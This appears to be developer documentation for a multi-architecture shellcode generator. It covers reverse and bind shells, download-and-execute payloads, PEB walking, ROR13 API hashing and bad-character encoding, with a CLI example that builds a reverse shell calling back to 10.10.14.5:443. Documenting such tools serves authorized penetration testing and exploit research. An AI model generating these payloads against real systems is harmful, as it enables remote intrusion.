# Shellcode Generator - Technical Documentation

**Author:** Dawid Esterhuizen
**Purpose:** Multi-architecture shellcode generation with bad character avoidance

---

## Development Guidelines

### Critical Rules
1. **NO GIT OPERATIONS**: Never execute git commands (add, commit, push, etc.)
   - Only print summaries of changes when requested
   - User handles all version control operations

2. **DOCUMENTATION REQUIREMENTS**: Always update when making major changes:
   - `README.md` - User-facing documentation
   - `CLAUDE.md` - Development notes and technical details
   - Tool-specific docs in respective directories

3. **CONSISTENCY**: Follow existing patterns, naming conventions, code style

---

## Tech Stack

- **Language:** Python 3.8+
- **Dependencies:** `keystone-engine` (assembly), `capstone` (disassembly), `rich` (terminal formatting)
- **Testing:** `unittest` (stdlib)
- **Linting:** flake8, black, isort, mypy (config in root `.flake8` / `pyproject.toml`)

### Running the Tools
```bash
# Shellcode generator
./shellgen/shellgen_cli.py --platform windows --payload messagebox --title "Test" --message "Hello"

# List available payloads
./shellgen/shellgen_cli.py --list-payloads

# ROR13 hash generator
./shellgen/hash_generator.py LoadLibraryA GetProcAddress
```

### Running Tests
```bash
# All shellgen tests
python3 -m unittest discover -s shellgen/tests

# Specific test file
python3 -m unittest shellgen/tests/test_encoders.py
```

### Linting
```bash
flake8 shellgen/
black --check shellgen/
isort --check-only shellgen/
```

---

## Architecture

```
shellgen/
├── src/
│   ├── encoders.py          # Bad char encoding (subtraction/addition)
│   ├── assembler.py         # Keystone/Capstone integration
│   ├── formatters.py        # Output: ASM, Python, C, raw, pyasm
│   ├── payloads.py          # High-level payload builders
│   ├── cli.py               # CLI interface
│   └── generators/
│       ├── windows.py       # x86/x64 - PEB walk, API resolution
│       └── linux.py         # ARM/ARM64 - Direct syscalls
├── shellgen_cli.py          # Main entry point
└── hash_generator.py        # ROR13 hash tool
```


---

## Supported Platforms & Architectures

| Platform | Architectures | Payloads |
|----------|---------------|----------|
| **Windows** | x86, x64 | messagebox, winexec, createprocess, shellexecute, system, download_exec, reverse_shell (x86), reverse_shell_x64, reverse_shell_powershell, bind_shell (x86), bind_shell_x64, bind_shell_simple |
| **Linux** | x86, x64, ARM, ARM64 | execve, reverse_shell, bind_shell |

### Output Formats
- **asm**: Assembly source code
- **python**: Python bytes string
- **c**: C-style char array
- **raw**: Raw binary shellcode
- **pyasm**: Python script with assembly for Keystone

---

## Key Features

### Bad Character Encoding (Windows x86/x64)
1. **Subtraction**: `clean - offset = target` with multiple increment strategies
2. **Addition**: `val1 + val2 = target` as fallback
3. **Default bad chars**: `0x00, 0x0a, 0x0d` (NULL, LF, CR)

### Windows Shellcode (x86/x64)
- **PEB Walk**: Robust kernel32.dll detection via BaseDllName.Length (x86) or "K" prefix check (x64)
- **Export Table Parsing**: Locates API functions via ROR13 hash resolution
- **Dynamic API Loading**: LoadLibraryA + GetProcAddress via hash lookup
- **String Consolidation**: Reuses strings to reduce shellcode size

**x86 Implementation:**
- PEB via `fs:[0x30]`, InInitializationOrderModuleList (offset 0x1C)
- Stack-based calling (stdcall), 4-byte pointers
- Registers: EBX=kernel32, [EBP+0x04]=find_function, [EBP+0x08]=LoadLibraryA

**x64 Implementation:**
- PEB via `gs:[0x60]`, InLoadInitOrder (offset 0x30)
- Fastcall convention (RCX, RDX, R8, R9 + stack), 32-byte shadow space
- 8-byte pointers, supports kernel32.dll and kernelbase.dll
- Registers: [RBP+0x08]=lookup_func, [RBP+0x10]=LoadLibraryA, [RBP+0x20]=kernel32 base

### Linux Shellcode (x86/x64/ARM/ARM64)
- **Direct Syscalls**: x86 `int 0x80` (eax=syscall#), x64 `syscall` (rax=syscall#), ARM32 `swi #0` (r7=syscall#), ARM64 `svc #0` (x8=syscall#)
- **Key Syscalls**: execve, socket, connect, dup2/dup3
- **Data Storage**: PC-relative addressing via `adr`, `.asciz` directives, stack-based argv

---

## CLI Options

| Option | Description | Default |
|--------|-------------|---------|
| `--list-payloads` | List available payloads | - |
| `--platform` | windows, linux | Required |
| `--payload` | Payload name | Required |
| `--arch` | x86, x64, arm, arm64 | x86 |
| `--format` | asm, python, c, raw, pyasm | asm |
| `--bad-chars` | Hex bytes to avoid (comma-separated) | 00 |
| `--json` | Load custom payload from JSON file | - |
| `--verify` | Verify shellcode for bad chars | False |
| `--debug-shellcode` | Disassemble with Capstone, map bad chars | False |
| `--no-exit` | Skip ExitProcess (Windows only) | False |
| `--output` | Output filename | stdout |
| `--generate-completion` | Print bash/zsh completion script and exit | - |

**Payload-specific options:** `--title`, `--message`, `--cmd`, `--url`, `--save-path`, `--host`, `--port`, `--shell`, `--show-window`

---

## Usage Examples

### Direct Usage
```bash
# List payloads
./shellgen_cli.py --list-payloads

# Windows x64 reverse shell
./shellgen_cli.py --platform windows --payload reverse_shell \
  --host 10.10.14.5 --port 443 --arch x64

# Linux ARM64 command execution
./shellgen_cli.py --platform linux --payload execve \
  --cmd "/bin/sh" --arch arm64 --format python

# After installation (via INSTALL.md)
shellgen --platform windows --payload messagebox --title "Test" --message "Hello"
hash_generator LoadLibraryA GetProcAddress
```

### Verification & Debugging
```bash
# Verify for bad characters
./shellgen_cli.py --platform windows --payload winexec \
  --cmd "calc.exe" --bad-chars 00,0a,0d,20 --verify

# Debug with Capstone disassembly
./shellgen_cli.py --platform windows --payload winexec \
  --cmd "calc.exe" --arch x86 --bad-chars 00,0a,0d,20 --debug-shellcode
```

**Debug output includes:**
- Complete disassembly with byte offsets
- Bad characters highlighted in red with "!!!" markers
- Mapping of bad chars to specific instructions (shows exact byte position)
- Recommendations for fixes (e.g., use LEA+MOV instead of scaled index)

---

## Python Library Usage

### Generate Windows MessageBox
```python
from src.generators import WindowsGenerator
from src.payloads import windows_messagebox
from src.assembler import assemble_to_binary

config = windows_messagebox(title="Pwned", message="Hello!", bad_chars={0x00, 0x0a, 0x0d})
generator = WindowsGenerator(config['bad_chars'], arch='x86')
asm_code = generator.generate(config)
shellcode = assemble_to_binary(asm_code, arch='x86')
```

### Custom Windows Payload
```python
from src.generators import WindowsGenerator

config = {
    'bad_chars': {0x00, 0x0a, 0x0d},
    'calls': [
        {'api': 'CreateFileA', 'dll': 'kernel32.dll',
         'args': ['C:\\test.txt', 0x40000000, 0, 0, 2, 0, 0],
         'save_result': 'esi'},
        {'api': 'WriteFile', 'dll': 'kernel32.dll',
         'args': ['REG:esi', 'Hello!', 6, 'REG:esp', 0]}
    ],
    'exit': True
}
generator = WindowsGenerator(config['bad_chars'], arch='x86')
asm_code = generator.generate(config)
```

### JSON Call Object Fields
- `api` — Windows API function name
- `dll` — DLL containing the function
- `args` — Argument array supporting the following types:
  - **Integer** (`0`, `1`, `0x40000000`) — pushed with bad-char encoding; `0`/`null` use `xor reg, reg` to avoid NULL bytes
  - **Hex string** (`"0x40000000"`) — converted to integer, then pushed with bad-char encoding
  - **`null`** — treated as `0` (NULL pointer)
  - **String** (`"C:\\test.txt"`) — pushed onto the stack, pointer passed as argument
  - **`"REG:reg"`** (`"REG:esi"`, `"REG:esp"`) — push the value of a register; use with `save_result` to pass a previous call's return value
  - **`"MEM:ref"`** (`"MEM:[ebp-4]"`, `"MEM:[esp+0x10]"`) — push from a memory reference; any `[...]` expression is emitted directly as `push [ref]`
  - *(internal)* **`"STR_PTR:str"`** — auto-generated by `consolidate_strings()` when a string appears in multiple calls; pushes the cached pointer instead of rebuilding the string on the stack. Users never write this in JSON.
- `save_result` — (optional) Register name to save EAX into after the call (e.g., `"esi"`, `"edi"`). Emits `mov <reg>, eax`. Use with `"REG:<reg>"` in later calls to reference the saved value. On x86, string prep uses `edi`/`esi`/`edx` as scratch — saved values in those registers may be clobbered by later calls with string arguments.

### JSON stack_alloc Field
- `stack_alloc` — (optional) Array of stack buffer allocations, processed before API calls
  - `name` — Register to point at the buffer (e.g., `"edi"`, `"ebx"`, `"r12"`)
  - `size` — Buffer size in bytes (int or hex string `"0x104"`)
  - `init_dword` — (optional) Initial DWORD value at buffer start (int or hex string)
  - All buffers allocated with a single `sub esp/rsp`, each register gets `mov`/`lea`
  - Bad char encoding applied to both allocation size and init values

---

## Dependencies

### Keystone Engine (Assembly)
```bash
pip install keystone-engine
```
Converts assembly → machine code (all architectures, LLVM-based)

### Capstone Engine (Disassembly)
```bash
pip install capstone
```
Converts machine code → assembly (required for `--debug-shellcode`)

---

## Version History

| Version | Key Changes |
|---------|-------------|
| **v3.10** | Stack allocation (`stack_alloc` JSON field) for output buffer pre-allocation with bad char encoding. PyASM `push_string` helper for encoding strings onto the stack avoiding bad chars. Bad chars forwarded to pyasm formatter. Fixed `format_output` validation order (unknown format checked before assembly). 158 tests (was 149). |
| **v3.9** | Shell completion: `--generate-completion {bash,zsh}` for `shellgen` and `hash_generator`, using shared `lib/completions.py`. 149 tests (was 127). |
| **v3.8.1** | Bug fixes: socket payload assembly (unformatted IP/port/shell placeholders in custom_asm), `--debug-shellcode` CLI flag name, sys.path ordering in shellgen_cli.py entry point |
| **v3.8** | x64 fixes: RIP-relative addressing, gen_push_string arch-aware, stack allocation bugs fixed, bind_shell_x64 payload added |
| **v3.7.1** | Bug fix: `--bad-chars` CLI override for JSON, Rich lib added to requirements |
| **v3.7** | ColorPrinter integration (lib/color_printer), visual enhancements (panels, hex preview, tables), enhanced payload listing |
| **v3.6** | Capstone-based `--debug-shellcode` (disassembly approach, fixes forward jumps, accurate byte-to-instruction mapping) |
| **v3.5** | Complete x64 support (PEB walk via gs:[0x60], fastcall convention, shadow space, TerminateProcess exit) |
| **v3.4** | Debug mode (`--debug-shellcode`), reverse shell fixes (WaitForSingleObject, handle inheritance) |
| **v3.3** | Reverse shell improvements (string preservation bug fix, native + PowerShell variants, WSASocketA integration) |
| **v3.2** | Enhanced payloads (CreateProcessA, ShellExecuteA, system via msvcrt.dll) |
| **v3.1** | OS-specific generators (WindowsGenerator, LinuxGenerator), unified interface |
| **v3.0** | Modular refactoring (core/generators/, encoders, formatters, payloads), library usage support |
| **v2.0** | ARM/ARM64 Linux support (execve, reverse_shell, direct syscalls) |
| **v1.0** | Initial x86 Windows support (PEB walk, ROR13 hash, bad char encoding) |

---

## ROR13 Hash Algorithm

```python
def ror13_hash(name):
    h = 0
    for c in name:
        h = ((h >> 13) | (h << 19)) & 0xFFFFFFFF
        h = (h + ord(c)) & 0xFFFFFFFF
    return h

# Known hashes:
# GetProcAddress: 0x7c0dfcaa
# LoadLibraryA: 0xec0e4e8e
```

---

## Limitations

1. **Windows ARM/ARM64**: Not implemented (different conventions)
2. **Bad Character Encoding**: Only Windows x86/x64
3. **Complex Payloads**: Some edge cases need manual adjustment

---

## Troubleshooting

| Error | Solution |
|-------|----------|
| "No module named 'keystone'" | `pip install keystone-engine` |
| "Cannot encode 0x..." | Reduce bad char restrictions, try different payload, manual encoding |
| "Unsupported platform/arch" | Check compatibility (Windows: x86/x64, Linux: arm/arm64) |

---

## Security Considerations

**Authorized defensive security testing only:**
- Penetration testing engagements
- Exploit development research
- Defensive security training
- Red team operations (authorized)
- CTF competitions

**Do not use for:**
- Unauthorized access
- Malware development
- Illegal activities

---

## References

- [PEB Walk Technique](https://en.wikipedia.org/wiki/Process_Environment_Block)
- [ROR13 Hash Algorithm](https://www.fireeye.com/blog/threat-research/2019/10/api-hashing-tool.html)
- [ARM Syscall Numbers](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md)
- [Keystone Engine](http://www.keystone-engine.org/)

---

*Maintained alongside codebase to track AI-assisted development.*